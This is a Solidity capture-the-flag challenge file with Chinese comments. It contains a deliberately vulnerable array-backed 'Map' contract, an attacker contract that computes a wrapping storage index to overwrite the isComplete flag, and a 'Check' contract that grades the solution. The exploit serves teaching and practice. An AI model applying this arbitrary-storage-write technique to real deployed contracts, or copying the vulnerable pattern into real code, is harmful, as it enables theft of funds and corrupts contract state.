// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;
// 这是一个用数组模拟的map，但貌似这样写有很严重的问题。尝试去修改isComplete变量吧！
contract Map {
    bool public isComplete;
    uint256[] map;
    constructor(){}
    function set(uint256 key, uint256 value) public {
        if (map.length <= key) {
            map.length = key + 1;
        }
        map[key] = value;
    }
    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}
contract att {
    Check che;
    Map map;
    constructor(Check addr) public {
        che = addr;
        map = che.map();
    }
    function attract() public {
        map.set(getindex(), 1);
        che.isCompleted();
    }
    function getindex() public pure returns(uint256 a){
        a = 2**256 - 1 - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
    }

    // 使用ABI时要用准确的类型，而不是大小相同的数值,这里两个的输出结果是不同的
    function getindex1() public pure returns(uint256 a){
        a = uint256(keccak256(abi.encodePacked(uint256(0))));
    }
    function getindex2() public pure returns(uint256 a){
        a = uint256(keccak256(abi.encodePacked(0)));
    }
}
contract Check{
    uint256 public score;
    Map public map;
    constructor() public {
        map = new Map();
    }
    function isCompleted() external {
        score = 0;
        if(isContract(msg.sender)){
            score += 25;
        }
        if(map.isComplete()){
            score += 75;
        }
    }
    function isContract(address addr) private view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}